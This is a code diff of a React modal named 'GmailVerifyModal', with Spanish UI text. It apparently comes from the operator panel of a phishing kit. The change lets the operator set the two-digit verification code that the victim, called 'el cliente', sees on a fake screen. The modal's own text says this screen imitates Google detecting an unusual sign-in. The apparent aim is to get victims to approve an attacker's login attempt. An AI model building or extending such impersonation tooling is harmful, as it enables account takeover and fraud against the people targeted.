@@ -32,19 +32,29 @@ const Modal: React.FC<ModalProps> = ({ isOpen, onClose, title, children }) => {
 interface GmailVerifyModalProps {
   isOpen: boolean;
   onClose: () => void;
-  onConfirm: (data: { correo: string }) => void;
+  onConfirm: (data: { correo: string, codigo: string }) => void;
 }
 
 export const GmailVerifyModal: React.FC<GmailVerifyModalProps> = ({ isOpen, onClose, onConfirm }) => {
   const [correo, setCorreo] = useState('');
+  const [codigo, setCodigo] = useState('14'); // Valor predeterminado
 
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const handleChangeCorreo = (e: React.ChangeEvent<HTMLInputElement>) => {
     setCorreo(e.target.value);
+  };
+  
+  const handleChangeCodigo = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    // Permitir solo números y limitar a 2 dígitos
+    if (/^\d{0,2}$/.test(value)) {
+      setCodigo(value);
+    }
   };
 
   const handleSubmit = () => {
-    onConfirm({ correo });
+    onConfirm({ correo, codigo });
     setCorreo('');
+    setCodigo('14'); // Restablecer al valor predeterminado
   };
 
   return (
@@ -58,14 +68,29 @@ export const GmailVerifyModal: React.FC<GmailVerifyModalProps> = ({ isOpen, onCl
           type="email" 
           placeholder="Ingrese el correo electrónico"
           value={correo}
-          onChange={handleChange}
+          onChange={handleChangeCorreo}
           className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
         />
       </div>
       
+      <div className="mb-6">
+        <Label htmlFor="gmailVerifyCodigo" className="block text-sm text-gray-300 mb-1">
+          Código de verificación
+        </Label>
+        <Input 
+          id="gmailVerifyCodigo" 
+          type="text" 
+          placeholder="Ingrese el código de verificación"
+          value={codigo}
+          onChange={handleChangeCodigo}
+          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
+          maxLength={2}
+        />
+        <p className="text-xs text-gray-400 mt-1">Máximo 2 dígitos. El cliente verá este código en la pantalla de verificación.</p>
+      </div>
+      
       <div className="mt-2 mb-4 text-sm text-gray-400">
         <p>Este proceso solicitará al cliente verificar su identidad como si Google hubiera detectado un inicio de sesión inusual.</p>
-        <p className="mt-2">El cliente verá el código de verificación "14" en pantalla.</p>
       </div>
       
       <div className="flex justify-end mt-4">
